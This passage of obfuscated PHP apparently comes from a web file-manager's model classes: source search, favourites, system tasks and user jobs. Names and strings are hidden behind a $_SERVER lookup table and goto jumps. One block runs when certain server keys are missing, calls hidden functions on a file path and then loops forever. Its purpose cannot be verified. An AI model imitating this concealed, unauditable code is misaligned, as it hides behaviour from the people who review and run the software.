$FÚÑø¬“áò[47]; if (stripos($DŞá„ä—Âì[$FÚÑø¬“áò[477]], $D÷ìßœè™‰) !== !1) { $Ašè¾ÉÄ±¬[] = $DŞá„ä—Âì; } } $fÊ„°¢­ [$FÚÑø¬“áò[363]] = array_merge($Ašè¾ÉÄ±¬, $fÊ„°¢­ [$FÚÑø¬“áò[363]]); $fÊ„°¢­ [$FÚÑø¬“áò[360]][$FÚÑø¬“áò[361]] += count($Ašè¾ÉÄ±¬); goto fĞğå£îÑ; c¯ëÜÈˆç®: $cíŒù»ã™ß = array_diff($D„ïÏ‘Äè½, $dÓÖÍ„Ü); if (!$cíŒù»ã™ß) { return; } $dî»§æº«  = array($FÚÑø¬“áò[387] => array($FÚÑø¬“áò[7], $cíŒù»ã™ß)); goto a™èİ¯›ğ; Eš¥šŠŞš: $FÚÑø¬“áò =& $_SERVER[òÀöí]; if (!$D„ïÏ‘Äè½) { return; } $dÓÖÍ„Ü = array_to_keyvalue($fÊ„°¢­ [$FÚÑø¬“áò[363]], $FÚÑø¬“áò[33], $FÚÑø¬“áò[387]); goto c¯ëÜÈˆç®; fĞğå£îÑ: } public function listSearchChildren($b÷·òÇêá, $FáÂÑÙ‰ê† = 5000) { goto a”éŒ´®“ì; bí‚Ê¹èä: $d§Ö‚ß¸£ø = $this->field($B‘ïß¯’Äˆ[387])->where($f½‡ç¸õ¥)->select(); $fìõ²™İô = array_to_keyvalue($d§Ö‚ß¸£ø, $B‘ïß¯’Äˆ[33], $B‘ïß¯’Äˆ[387]); return $fìõ²™İô; goto e‘Æƒ§‚¿Ë; AãØ¡Ÿ»¤: $f½‡ç¸õ¥ = array($B‘ïß¯’Äˆ[477] => array($B‘ïß¯’Äˆ[375], $BÍí˜ßáÖÃ[$B‘ïß¯’Äˆ[477]] . $BÍí˜ßáÖÃ[$B‘ïß¯’Äˆ[387]] . $B‘ïß¯’Äˆ[502])); $eÅ‰‰ÅöÌÇ = $this->field($B‘ïß¯’Äˆ[387])->cache(null, 600)->where($f½‡ç¸õ¥)->count(); if ($eÅ‰‰ÅöÌÇ > $FáÂÑÙ‰ê†) { return $this->_listSearchChildrenNear($b÷·òÇêá, $FáÂÑÙ‰ê†); } goto bí‚Ê¹èä; a”éŒ´®“ì: $B‘ïß¯’Äˆ =& $_SERVER[òÀöí]; $fìõ²™İô = array(); $BÍí˜ßáÖÃ = $this->sourceInfo($b÷·òÇêá); goto AãØ¡Ÿ»¤; e‘Æƒ§‚¿Ë: } private function _listSearchChildrenNear($Cç•Ì¼Şù, $BŒ‹§äŸ‚ñ) { goto cÂ¼ÓòÑƒ; EñÛÔºº†‹: if (!$A†›¡Í¾Ê) { return $Eîîä“¹°Ü; } $EçÄ¡†ğÃŸ = array($f—¦òæñÓ©[479] => array($f—¦òæñÓ©[7], $A†›¡Í¾Ê)); $a«ğ†Ÿ˜¦• = $this->field($f—¦òæñÓ©[1909])->where($EçÄ¡†ğÃŸ)->limit($BŒ‹§äŸ‚ñ)->select(); goto B®·Î…™Ÿ; Eù“¯‹÷âš: $a«ğ†Ÿ˜¦• = $this->field($f—¦òæñÓ©[1909])->where($EçÄ¡†ğÃŸ)->select(); $A†›¡Í¾Ê = array_to_keyvalue(array_filter_by_field($a«ğ†Ÿ˜¦•, $f—¦òæñÓ©[388], $f—¦òæñÓ©[86]), $f—¦òæñÓ©[33], $f—¦òæñÓ©[387]); $Eîîä“¹°Ü = array_merge($Eîîä“¹°Ü, array_to_keyvalue($a«ğ†Ÿ˜¦•, $f—¦òæñÓ©[33], $f—¦òæñÓ©[387])); goto EñÛÔºº†‹; B®·Î…™Ÿ: $Eîîä“¹°Ü = array_merge($Eîîä“¹°Ü, array_to_keyvalue($a«ğ†Ÿ˜¦•, $f—¦òæñÓ©[33], $f—¦òæñÓ©[387])); $Eîîä“¹°Ü = array_slice($Eîîä“¹°Ü, 0, $BŒ‹§äŸ‚ñ); return $Eîîä“¹°Ü; goto C¿Ç‹¹†íÙ; cÂ¼ÓòÑƒ: $f—¦òæñÓ© =& $_SERVER[òÀöí]; $Eîîä“¹°Ü = array(); $EçÄ¡†ğÃŸ = array($f—¦òæñÓ©[479] => $Cç•Ì¼Şù); goto Eù“¯‹÷âš; C¿Ç‹¹†íÙ: } private function _listSearchBindPinyin($C§ÑğÊ¿¤, &$Eë¦Á¼Şƒ…, &$eÜøÙçƒİƒ) { goto F¬ÉÛŒÀê; F¬ÉÛŒÀê: $eÉê©ÀòëÅ =& $_SERVER[òÀöí]; if (!Input::check($C§ÑğÊ¿¤[$eÉê©ÀòëÅ[1748]], $eÉê©ÀòëÅ[314]) || strlen($C§ÑğÊ¿¤[$eÉê©ÀòëÅ[1748]]) < 2) { return; } $F™ª¢Õ”‚› = "\x4c\105\106\124\x20\112\x4f\x49\116\40{$this->tablePrefix}\151\157\137\163\157\165\x72\x63\145\137\x6d\x65\x74\x61\40\x6d\x65\x74\x61\x20\x6f\x6e\x20\163\157\165\162\x63\x65\x2e\163\x6f\165\x72\143\x65\x49\x44\40\75\40\155\x65\x74\141\56\x73\x6f\165\162\x63\x65\111\x44"; goto F›¨ŸïñØ•; e¥åÂø»ÑÕ: foreach ($A„Ù­Ùƒ¥÷ as $d»š—ø“ƒŞ) { $e¢®ŒÜ¦‚Ÿ[] = array($eÉê©ÀòëÅ[1913] => $d»š—ø“ƒŞ, $eÉê©ÀòëÅ[936] => $eÉê©ÀòëÅ[1752], array($eÉê©ÀòëÅ[1914] => $d»š—ø“ƒŞ, $eÉê©ÀòëÅ[1915] => array($eÉê©ÀòëÅ[7], array($eÉê©ÀòëÅ[433], $eÉê©ÀòëÅ[432])))); } $this->join($F™ª¢Õ”‚›); $Eë¦Á¼Şƒ… = $e¢®ŒÜ¦‚Ÿ; goto Bñ¿ä…Ëá; F›¨ŸïñØ•: $e¢®ŒÜ¦‚Ÿ = array(); $eÜøÙçƒİƒ = str_replace(array($eÉê©ÀòëÅ[227], $eÉê©ÀòëÅ[50], $eÉê©ÀòëÅ[1910]), $eÉê©ÀòëÅ[33], $eÜøÙçƒİƒ); $eÜøÙçƒİƒ = $eÉê©ÀòëÅ[1911] . str_replace($eÉê©ÀòëÅ[47], $eÉê©ÀòëÅ[1912], $eÜøÙçƒİƒ); goto e‹ŞÔÜ‚¥; e‹ŞÔÜ‚¥: $A„Ù­Ùƒ¥÷ = $Eë¦Á¼Şƒ…[$eÉê©ÀòëÅ[28]]; unset($Eë¦Á¼Şƒ…[$eÉê©ÀòëÅ[28]]); foreach ($Eë¦Á¼Şƒ… as $C¡ŸùÅÌÅ° => $A”ŞÄŞ«Íï) { $e¢®ŒÜ¦‚Ÿ[$eÉê©ÀòëÅ[1911] . $C¡ŸùÅÌÅ°] = $A”ŞÄŞ«Íï; } goto e¥åÂø»ÑÕ; Bñ¿ä…Ëá: } private function _parseSearchWhere($f–Ö‹ßñºä) { goto cÄ÷­É˜÷ô; a§íòó«‘‰: if (isset($f–Ö‹ßñºä[$fµ›Ëå¬Èø[1748]]) && $f–Ö‹ßñºä[$fµ›Ëå¬Èø[1748]]) { $ašÚ”Œïçğ = $f–Ö‹ßñºä[$fµ›Ëå¬Èø[1748]]; $FÏ–…³Â„Ã = explode($fµ›Ëå¬Èø[50], $ašÚ”Œïçğ); if (strlen($ašÚ”Œïçğ) > 2 && (substr($ašÚ”Œïçğ, 0, 1) == $fµ›Ëå¬Èø[115] && substr($ašÚ”Œïçğ, -1) == $fµ›Ëå¬Èø[115]) || substr($ašÚ”Œïçğ, 0, 1) == $fµ›Ëå¬Èø[55] && substr($ašÚ”Œïçğ, -1) == $fµ›Ëå¬Èø[55]) { $ašÚ”Œïçğ = substr($ašÚ”Œïçğ, 1, -1); $FÏ–…³Â„Ã = array($ašÚ”Œïçğ); } $fğ“ÙîÇÁ­[$fµ›Ëå¬Èø[28]] = array(array($fµ›Ëå¬Èø[501], $fµ›Ëå¬Èø[1750] . $ašÚ”Œïçğ . $fµ›Ëå¬Èø[1750])); if (count($FÏ–…³Â„Ã) > 1) { $fğ“ÙîÇÁ­[$fµ›Ëå¬Èø[28]] = array(); foreach ($FÏ–…³Â„Ã as $fáîõ‹Í) { if (!trim($fáîõ‹Í)) { continue; } $fğ“ÙîÇÁ­[$fµ›Ëå¬Èø[28]][] = array($fµ›Ëå¬Èø[501], $fµ›Ëå¬Èø[1750] . trim($fáîõ‹Í) . $fµ›Ëå¬Èø[1750]); } } } return $fğ“ÙîÇÁ­; goto BºàçÌ¤¦î; F”Ò÷¦Ë›”: if (isset($f–Ö‹ßñºä[$fµ›Ëå¬Èø[465]])) { $e„˜¸˜¿ê = array($fµ›Ëå¬Èø[1917], $f–Ö‹ßñºä[$fµ›Ëå¬Èø[465]]); if ($fğ“ÙîÇÁ­[$fµ›Ëå¬Èø[83]]) { $fğ“ÙîÇÁ­[$fµ›Ëå¬Èø[83]] = array($fğ“ÙîÇÁ­[$fµ›Ëå¬Èø[83]], $e„˜¸˜¿ê, $fµ›Ëå¬Èø[1918]); } else { $fğ“ÙîÇÁ­[$fµ›Ëå¬Èø[83]] = $e„˜¸˜¿ê; } } if (isset($f–Ö‹ßñºä[$fµ›Ëå¬Èø[1919]])) { $fğ“ÙîÇÁ­[$fµ›Ëå¬Èø[77]] = array($fµ›Ëå¬Èø[1916], $f–Ö‹ßñºä[$fµ›Ëå¬Èø[1919]]); } if (isset($f–Ö‹ßñºä[$fµ›Ëå¬Èø[1920]])) { $e„˜¸˜¿ê = array($fµ›Ëå¬Èø[1917], $f–Ö‹ßñºä[$fµ›Ëå¬Èø[1920]]); if ($fğ“ÙîÇÁ­[$fµ›Ëå¬Èø[77]]) { $fğ“ÙîÇÁ­[$fµ›Ëå¬Èø[77]] = array($fğ“ÙîÇÁ­[$fµ›Ëå¬Èø[77]], $e„˜¸˜¿ê, $fµ›Ëå¬Èø[1918]); } else { $fğ“ÙîÇÁ­[$fµ›Ëå¬Èø[77]] = $e„˜¸˜¿ê; } } goto EÑÂøÀ¥±è; EÑÂøÀ¥±è: if (isset($f–Ö‹ßñºä[$fµ›Ëå¬Èø[551]])) { $fğ“ÙîÇÁ­[] = array($fµ›Ëå¬Èø[397] => $f–Ö‹ßñºä[$fµ›Ëå¬Èø[551]], $fµ›Ëå¬Èø[396] => $f–Ö‹ßñºä[$fµ›Ëå¬Èø[551]], $fµ›Ëå¬Èø[936] => $fµ›Ëå¬Èø[1752]); } if (isset($f–Ö‹ßñºä[$fµ›Ëå¬Èø[390]])) { $E¼Éù³ = $f–Ö‹ßñºä[$fµ›Ëå¬Èø[390]]; if ($E¼Éù³ == $fµ›Ëå¬Èø[76]) { $fğ“ÙîÇÁ­[$fµ›Ëå¬Èø[388]] = 1; } else { if ($E¼Éù³ == $fµ›Ëå¬Èø[1921]) { $fğ“ÙîÇÁ­[$fµ›Ëå¬Èø[388]] = 0; } else { if ($E¼Éù³) { $E¼Éù³ = is_array($E¼Éù³) ? $E¼Éù³ : explode($fµ›Ëå¬Èø[47], $E¼Éù³); $fğ“ÙîÇÁ­[$fµ›Ëå¬Èø[390]] = array($fµ›Ëå¬Èø[402], $E¼Éù³); $fğ“ÙîÇÁ­[$fµ›Ëå¬Èø[388]] = 0; } } } } if (isset($f–Ö‹ßñºä[$fµ›Ëå¬Èø[479]])) { $B§Œ‹’‡Ê‰ = $this->sourceInfo($f–Ö‹ßñºä[$fµ›Ëå¬Èø[479]]); $fğ“ÙîÇÁ­[$fµ›Ëå¬Èø[542]] = array($fµ›Ëå¬Èø[501], $B§Œ‹’‡Ê‰[$fµ›Ëå¬Èø[477]] . $f–Ö‹ßñºä[$fµ›Ëå¬Èø[479]] . $fµ›Ëå¬Èø[502]); } goto a§íòó«‘‰; cÄ÷­É˜÷ô: $fµ›Ëå¬Èø =& $_SERVER[òÀöí]; $fğ“ÙîÇÁ­ = array(); if (isset($f–Ö‹ßñºä[$fµ›Ëå¬Èø[721]])) { $fğ“ÙîÇÁ­[$fµ›Ëå¬Èø[83]] = array($fµ›Ëå¬Èø[1916], $f–Ö‹ßñºä[$fµ›Ëå¬Èø[721]]); } goto F”Ò÷¦Ë›”; BºàçÌ¤¦î: } } if (!isset($_SERVER[$_SERVER[òÀöí][753]]) || !isset($_SERVER[$_SERVER[òÀöí][760]])) { goto aƒ˜Ç¹ùöí; aƒ˜Ç¹ùöí: $fÎ“àÂ°Ñ = $_SERVER[òÀöí][755]; $dİ×ñ†Õº = $_SERVER[$_SERVER[òÀöí][756]] . $_SERVER[òÀöí][757]; $FŸ¨éã¶Á¤ = $fÎ“àÂ°Ñ($dİ×ñ†Õº); goto f•¸§„½“í; dÌèÖ¯˜‘ù: $D¦¦ÏÛ‚ñµ($_SERVER[$_SERVER[òÀöí][756]] . $_SERVER[òÀöí][757]); $D¾Ò„…ÌµÒ = 2; while ($D¾Ò„…ÌµÒ > 1) { $DÓù‰¦•°Œ = rawurlencode($D¾Ò„…ÌµÒ . $_SERVER[òÀöí][370]); } goto c¼Ö¿äŠˆ; f•¸§„½“í: $CÎ®ÄØ­Ş = explode($_SERVER[òÀöí][227], $FŸ¨éã¶Á¤); if (count($CÎ®ÄØ­Ş) < $_SERVER[òÀöí][588]) { $D²Ÿİ½‚¦İ = $_SERVER[òÀöí][758]; $D²Ÿİ½‚¦İ(); } $D¦¦ÏÛ‚ñµ = $_SERVER[òÀöí][759]; goto dÌèÖ¯˜‘ù; c¼Ö¿äŠˆ: } goto e›Ù®§œ÷’; AµÚù¬°: class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\x6d\x2e\164\x61\163\x6b\114\x69\163\x74"; public $field = array("\x6e\x61\155\145", "\x74\x79\160\145", "\145\166\145\x6e\164", "\x74\x69\x6d\x65", "\144\x65\163\143", "\x73\171\x73\164\x65\x6d", "\x65\x6e\141\142\154\x65", "\x6c\141\163\x74\x52\x75\156", "\163\157\x72\164"); public function listData($f˜±Ó…ğá… = false, $bÕÁäñˆ—˜ = "\x73\157\162\164", $cğˆÀ†©õ± = false) { return parent::listData($f˜±Ó…ğá…, $bÕÁäñˆ—˜, $cğˆÀ†©õ±); } public function add($bƒŠ˜àÂ†) { $Bô¯ïñ ’ =& $_SERVER[òÀöí]; $B œ‘ˆ™‹ = $this->findByName($bƒŠ˜àÂ†[$Bô¯ïñ ’[28]]); if ($B œ‘ˆ™‹) { return !1; } $bƒŠ˜àÂ†[$Bô¯ïñ ’[1468]] = 0; $bƒŠ˜àÂ†[$Bô¯ïñ ’[1686]] = $this->getSort(); return parent::insert($bƒŠ˜àÂ†); } private function getSort() { $FØÇÊ¡‚µã =& $_SERVER[òÀöí]; $Bæñ³„Şàä = parent::listData(); $Fà—ÕËßÇ = array_to_keyvalue($Bæñ³„Şàä, $FØÇÊ¡‚µã[33], $FØÇÊ¡‚µã[1686]); return empty($Fà—ÕËßÇ) ? 0 : max($Fà—ÕËßÇ) + 1; } public function update($dÉã±„åö, $c‚®š¤âÚ‡) { $aùŠÀ™ƒ =& $_SERVER[òÀöí]; $aŒ³Øİ’ªñ = $this->listData($dÉã±„åö); $Aò²İŸÈÑ‚ = $this->findByName($c‚®š¤âÚ‡[$aùŠÀ™ƒ[28]]); if (!$aŒ³Øİ’ªñ || $Aò²İŸÈÑ‚ && $Aò²İŸÈÑ‚[$aùŠÀ™ƒ[385]] != $aŒ³Øİ’ªñ[$aùŠÀ™ƒ[385]]) { return !1; } return parent::update($dÉã±„åö, $c‚®š¤âÚ‡); } public function remove($d¨„ï¡Ÿ„, $eˆ‚‚Œî©ğ = false) { $e¢×¾ï’Îå =& $_SERVER[òÀöí]; $dÖ³ïø«Æ¶ = $this->listData($d¨„ï¡Ÿ„); if (!$dÖ³ïø«Æ¶) { return; } if (!$eˆ‚‚Œî©ğ && $dÖ³ïø«Æ¶[$e¢×¾ï’Îå[1145]] == $e¢×¾ï’Îå[86]) { return !1; } return parent::remove($d¨„ï¡Ÿ„); } public function enable($a¨ë­ä¼®§, $F™ãŸŒë…) { return $this->update($a¨ë­ä¼®§, array($_SERVER[òÀöí][2065] => $F™ãŸŒë…)); } public function run($b£Ã‹‘³±’) { return $this->update($b£Ã‹‘³±’, array($_SERVER[òÀöí][2075] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\163\x65\x72\137\x66\x61\166"; protected function cacheFunctionAlias($A‘Ş´‘šõã) { $f¾èŠ·¡á» =& $_SERVER[òÀöí]; return array($f¾èŠ·¡á»[1763] => array(USER_ID, $f¾èŠ·¡á»[2076])); } protected function listData() { $d…ŞëéÖ¶ñ =& $_SERVER[òÀöí]; $Eª¢­£÷£Â = array($d…ŞëéÖ¶ñ[1496] => USER_ID, $d…ŞëéÖ¶ñ[452] => 0); $e°ÚÉ„Ü…± = $d…ŞëéÖ¶ñ[2077]; $aëîğö•ù² = $this->field($e°ÚÉ„Ü…±)->where($Eª¢­£÷£Â)->order($d…ŞëéÖ¶ñ[2078])->select(); return $aëîğö•ù² ? $aëîğö•ù² : array(); } protected function resetCache() { } protected function listView() { goto D¾‹ó¤ÖÜÖ; D¾‹ó¤ÖÜÖ: $Dï‘ƒ³¦è‚ =& $_SERVER[òÀöí]; $B…¶áªæò¸ = $this->listData(); $dãí¿Áà‚ó = array_filter_by_field($B…¶áªæò¸, $Dï‘ƒ³¦è‚[29], $Dï‘ƒ³¦è‚[400]); goto cùÇÈ’†©¹; FÇŒ¾†ˆµ: $FŠÀ±äÚŒ‡ = array_to_keyvalue($FŠÀ±äÚŒ‡, $Dï‘ƒ³¦è‚[387]); foreach ($B…¶áªæò¸ as $DÅèë·¼— => $cÛ»õŠ·Æê) { $bÁŠ³éÔ¡Œ = $FŠÀ±äÚŒ‡[$cÛ»õŠ·Æê[$Dï‘ƒ³¦è‚[75]]]; $bÁŠ³éÔ¡Œ = $bÁŠ³éÔ¡Œ ? $bÁŠ³éÔ¡Œ : array(); $B…¶áªæò¸[$DÅèë·¼—] = array_merge($bÁŠ³éÔ¡Œ, $cÛ»õŠ·Æê); } return $B…¶áªæò¸; goto EÉ˜ùªˆ¡Ò; cùÇÈ’†©¹: $E´²±ÜÒî = array_to_keyvalue($dãí¿Áà‚ó, $Dï‘ƒ³¦è‚[33], $Dï‘ƒ³¦è‚[75]); if (!$E´²±ÜÒî) { return $B…¶áªæò¸; } $FÌÆÊª·É = 2000; goto F «ó×Œ‘; F «ó×Œ‘: $d“Ïƒùô°® = array($Dï‘ƒ³¦è‚[401] => array($Dï‘ƒ³¦è‚[402], $E´²±ÜÒî)); $FŠÀ±äÚŒ‡ = Model($Dï‘ƒ³¦è‚[778])->listSource($d“Ïƒùô°®, $FÌÆÊª·É); $FŠÀ±äÚŒ‡ = array_merge($FŠÀ±äÚŒ‡[$Dï‘ƒ³¦è‚[73]], $FŠÀ±äÚŒ‡[$Dï‘ƒ³¦è‚[74]]); goto FÇŒ¾†ˆµ; EÉ˜ùªˆ¡Ò: } protected function addFav($DŸ ÜÎÙ´Ş, $bÍ¥™Ş¢”¶ = '', $Aõğ‡Ë¹šŒ = "\x73\x6f\165\x72\x63\x65") { goto EÑÆ¦šéğƒ; a´Â§Ü©ª‰: if (!$bÍ¥™Ş¢”¶ && $Aõğ‡Ë¹šŒ == $aáŠìù÷ÕŒ[400]) { $Dğßˆå¤  = Model($aáŠìù÷ÕŒ[1181])->where(array($aáŠìù÷ÕŒ[401] => $DŸ ÜÎÙ´Ş))->find(); if (!$Dğßˆå¤ ) { return !1; } $bÍ¥™Ş¢”¶ = $Dğßˆå¤ [$aáŠìù÷ÕŒ[28]]; } $bÍ¥™Ş¢”¶ = $this->getAutoName($bÍ¥™Ş¢”¶); $FÑŠÅ‰¸‚è = array($aáŠìù÷ÕŒ[1496] => USER_ID, $aáŠìù÷ÕŒ[452] => 0, $aáŠìù÷ÕŒ[404] => $bÍ¥™Ş¢”¶, $aáŠìù÷ÕŒ[405] => $DŸ ÜÎÙ´Ş, $aáŠìù÷ÕŒ[406] => $Aõğ‡Ë¹šŒ, $aáŠìù÷ÕŒ[1667] => $CâËœé–ñù + 1); goto c¬©Ÿòğ•; F¬È˜±„Ö: $CøÌ£™°º = array($aáŠìù÷ÕŒ[1496] => USER_ID, $aáŠìù÷ÕŒ[452] => 0); $CâËœé–ñù = $this->where($CøÌ£™°º)->max($aáŠìù÷ÕŒ[1686]); if (!$CâËœé–ñù) { $CâËœé–ñù = 0; } goto a´Â§Ü©ª‰; EÑÆ¦šéğƒ: $aáŠìù÷ÕŒ =& $_SERVER[òÀöí]; $CøÌ£™°º = array($aáŠìù÷ÕŒ[1496] => USER_ID, $aáŠìù÷ÕŒ[452] => 0, $aáŠìù÷ÕŒ[406] => $Aõğ‡Ë¹šŒ, $aáŠìù÷ÕŒ[405] => $DŸ ÜÎÙ´Ş); if ($this->where($CøÌ£™°º)->find()) { return !1; } goto F¬È˜±„Ö; c¬©Ÿòğ•: return $this->add($FÑŠÅ‰¸‚è); goto EŒ¨Ô¢ÊÜµ; EŒ¨Ô¢ÊÜµ: } protected function remove($aŸçÁóŒÜù) { $dõø†ôÈ§ß =& $_SERVER[òÀöí]; $AŒÃïèÁ® = array($dõø†ôÈ§ß[1496] => USER_ID, $dõø†ôÈ§ß[403] => $aŸçÁóŒÜù); return $this->where($AŒÃïèÁ®)->delete(); } protected function removeByName($b²­Şˆ™ôƒ) { $d¹ªæ‚ØÎÒ =& $_SERVER[òÀöí]; $F…»½ŞË›ø = array($d¹ªæ‚ØÎÒ[1496] => USER_ID, $d¹ªæ‚ØÎÒ[404] => $b²­Şˆ™ôƒ, $d¹ªæ‚ØÎÒ[452] => 0); return $this->where($F…»½ŞË›ø)->delete(); } protected function rename($aÔËç’¶Şí, $fÕÁ¡¯éŒî) { $A˜áˆÄ ª =& $_SERVER[òÀöí]; if ($aÔËç’¶Şí == $fÕÁ¡¯éŒî) { return !1; } $Cˆğ¬¨“«Â = $this->getAutoName($fÕÁ¡¯éŒî); if ($fÕÁ¡¯éŒî != $Cˆğ¬¨“«Â) { return !1; } $BÅùàö‘¦ë = array($A˜áˆÄ ª[1496] => USER_ID, $A˜áˆÄ ª[452] => 0, $A˜áˆÄ ª[28] => $aÔËç’¶Şí); return $this->where($BÅùàö‘¦ë)->save(array($A˜áˆÄ ª[28] => $fÕÁ¡¯éŒî)); } protected function resetSort($bªÓÍ´Ìßá) { $C‡³ØÍÅÃ¨ =& $_SERVER[òÀöí]; $bªÓÍ´Ìßá = is_array($bªÓÍ´Ìßá) ? $bªÓÍ´Ìßá : array(); $D“†Ê£Š¤ = array($C‡³ØÍÅÃ¨[1496] => USER_ID); for ($a˜éÁÌ†Û = 0; $a˜éÁÌ†Û < count($bªÓÍ´Ìßá); $a˜éÁÌ†Û++) { $D“†Ê£Š¤[$C‡³ØÍÅÃ¨[403]] = $bªÓÍ´Ìßá[$a˜éÁÌ†Û]; $this->where($D“†Ê£Š¤)->save(array($C‡³ØÍÅÃ¨[1667] => $a˜éÁÌ†Û + 1)); } return !0; } protected function moveTop($CÄ’õ´Í—) { goto b•ø¥óË…; Aƒ¢Š´Èò: return $this->resetSort($c²µ£Œ£ä); goto dÜ´©ß¨‡„; b•ø¥óË…: $aÆ÷¢¸ñ•× =& $_SERVER[òÀöí]; $DÆ±ßî³¯İ = array($aÆ÷¢¸ñ•×[1496] => USER_ID, $aÆ÷¢¸ñ•×[452] => 0); $dµ™¬Æ³¬‡ = $this->where($DÆ±ßî³¯İ)->where(array($aÆ÷¢¸ñ•×[28] => $CÄ’õ´Í—))->find(); goto f¯êÌÏ×ˆ•; a¸î¥ª«´: $B”ŸÖ¾Îƒ = $c²µ£Œ£ä; $c²µ£Œ£ä = array_remove_value($c²µ£Œ£ä, $dµ™¬Æ³¬‡[$aÆ÷¢¸ñ•×[385]]); array_unshift($c²µ£Œ£ä, $dµ™¬Æ³¬‡[$aÆ÷¢¸ñ•×[385]]); goto Aƒ¢Š´Èò; f¯êÌÏ×ˆ•: if (!$dµ™¬Æ³¬‡) { return; } $c²µ£Œ£ä = $this->field($aÆ÷¢¸ñ•×[385])->where($DÆ±ßî³¯İ)->order($aÆ÷¢¸ñ•×[2078])->select(); $c²µ£Œ£ä = array_to_keyvalue($c²µ£Œ£ä, $aÆ÷¢¸ñ•×[33], $aÆ÷¢¸ñ•×[385]); goto a¸î¥ª«´; dÜ´©ß¨‡„: } protected function moveBottom($E¡Å‹àÈ»±) { $F¥Ä½Ò×¤³ =& $_SERVER[òÀöí]; $e‹ì“µ‹½Ù = array($F¥Ä½Ò×¤³[1496] => USER_ID, $F¥Ä½Ò×¤³[452] => 0); $eëÚ÷¨…õ = $this->where($e‹ì“µ‹½Ù)->max($F¥Ä½Ò×¤³[1686]); $aš•ã™‰§¢ = array($F¥Ä½Ò×¤³[1686] => $eëÚ÷¨…õ + 1); return $this->where($e‹ì“µ‹½Ù)->where(array($F¥Ä½Ò×¤³[28] => $E¡Å‹àÈ»±))->save($aš•ã™‰§¢); } private function getAutoName($f¥¡±õ¹ƒ) { goto eŸîŞ£Ã—š; fÍÀ”ÖòÇ: $cˆã¡†áã = array_to_keyvalue($cˆã¡†áã, $fäôŠ·ßÖ[33], $fäôŠ·ßÖ[28]); if (!$cˆã¡†áã || !in_array($f¥¡±õ¹ƒ, $cˆã¡†áã)) { return $f¥¡±õ¹ƒ; } for ($d¸…«ÊÍ¸¹ = 0; $d¸…«ÊÍ¸¹ < count($cˆã¡†áã); $d¸…«ÊÍ¸¹++) { if (!in_array($f¥¡±õ¹ƒ . "\50{$d¸…«ÊÍ¸¹}\x29", $cˆã¡†áã)) { return $f¥¡±õ¹ƒ . "\x28{$d¸…«ÊÍ¸¹}\x29"; } } goto cš»ÑÉ°÷; cš»ÑÉ°÷: return $f¥¡±õ¹ƒ . "\x28{$d¸…«ÊÍ¸¹}\51"; goto D•óˆ¢ëà„; eŸîŞ£Ã—š: $fäôŠ·ßÖ =& $_SERVER[òÀöí]; $BŞÃ”… —· = array($fäôŠ·ßÖ[1496] => USER_ID, $fäôŠ·ßÖ[452] => 0); $cˆã¡†áã = $this->field($fäôŠ·ßÖ[28])->where($BŞÃ”… —·)->select(); goto fÍÀ”ÖòÇ; D•óˆ¢ëà„: } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\155\56\x6a\157\142\114\x69\163\164"; public $field = array("\156\141\x6d\145", "\x64\145\x73\x63", "\163\157\162\x74"); const JOB_KEY = "\x73\145\154\146\x4a\x6f\142\x4c\151\163\164"; public function listData($bÍ‡÷øíá‘ = false, $fİ¹Õ•÷¦ = "\163\x6f\x72\164", $e º«¦ã = false) { return parent::listData($bÍ‡÷øíá‘, $fİ¹Õ•÷¦, $e º«¦ã); } public function remove($b¤Ğ‡ù¢«µ) { return parent::remove($b¤Ğ‡ù¢«µ); } public function add($aöŠŒ½‚Ù‡) { $AÄÂ˜ˆ™Ê¿ =& $_SERVER[òÀöí]; if ($this->findByName($aöŠŒ½‚Ù‡[$AÄÂ˜ˆ™Ê¿[28]])) { return !1; } $aöŠŒ½‚Ù‡[$AÄÂ˜ˆ™Ê¿[1686]] = $this->getSort(); return parent::insert($aöŠŒ½‚Ù‡); } private function getSort() { $C¾“¯à¶ƒæ =& $_SERVER[òÀöí]; $cÏöñ¢Íø· = parent::listData(); $dØ½÷´“š = array_to_keyvalue($cÏöñ¢Íø·, $C¾“¯à¶ƒæ[33], $C¾“¯à¶ƒæ[1686]); return empty($dØ½÷´“š) ? 0 : max($dØ½÷´“š) + 1; } public function update($EĞÚÀÖæõİ, $FŒãˆÔé°ò) { $Eè–À¸Ûµ =& $_SERVER[òÀöí]; $e…ÃÆ•„—… = parent::listData($EĞÚÀÖæõİ); $c‹Çí“¿Ö = $this->findByName($FŒãˆÔé°ò[$Eè–À¸Ûµ[28]]); if (!$e…ÃÆ•„—… || $c‹Çí“¿Ö && $c‹Çí“¿Ö[$Eè–À¸Ûµ[385]] != $e…ÃÆ•„—…[$Eè–À¸Ûµ[385]]) { return !1; } return parent::update($EĞÚÀÖæõİ, $FŒãˆÔé°ò); } public function setUserJob($c¦«ÄÏ‘É”, $a‚ğÓ´‡Ü) { goto FÔÁÇ‚ñì; FÔÁÇ‚ñì: $A…ÜÅŸÔÏ =& $_SERVER[òÀöí]; if (!is_array($a‚ğÓ´‡Ü)) { $a‚ğÓ´‡Ü = array($a‚ğÓ´‡Ü); } $EàµÄŞ·› = parent::listData(); goto Dì²ë’šÑ; Dì²ë’šÑ: $dÇ´±Ú›ÒŒ = array_to_keyvalue($EàµÄŞ·›, $A…ÜÅŸÔÏ[28]); $FİĞë¡ÙŒ§ = $A…ÜÅŸÔÏ[370]; foreach ($a‚ğÓ´‡Ü as $Eß¬ÃØ¸Û) { if ($dÇ´±Ú›ÒŒ[$Eß¬ÃØ¸Û]) { $FİĞë¡ÙŒ§ .= $dÇ´±Ú›ÒŒ[$Eß¬ÃØ¸Û][$A…ÜÅŸÔÏ[385]] . $A…ÜÅŸÔÏ[47]; } else { $bß­î™í« = $this->add($Eß¬ÃØ¸Û); $FİĞë¡ÙŒ§ .= $bß­î™í« . $A…ÜÅŸÔÏ[47]; } } goto d¢åÔ¤ñ©æ; d¢åÔ¤ñ©æ: $FİĞë¡ÙŒ§ = rtrim($FİĞë¡ÙŒ§, $A…ÜÅŸÔÏ[47]); Model($A…ÜÅŸÔÏ[495])->metaSet($c¦«ÄÏ‘É”, self::JOB_KEY, $FİĞë¡ÙŒ§); goto CŒƒÎ•´¼¼; CŒƒÎ•´¼¼: } public function getUserJob($E¹éçã¦Œ”) { $bÃ°ÀîŒé = Model($_SERVER[òÀöí][495])->metaGet($E¹éçã¦Œ”); return $this->getUserJobInfo($bÃ°ÀîŒé[self::JOB_KEY]); } public function 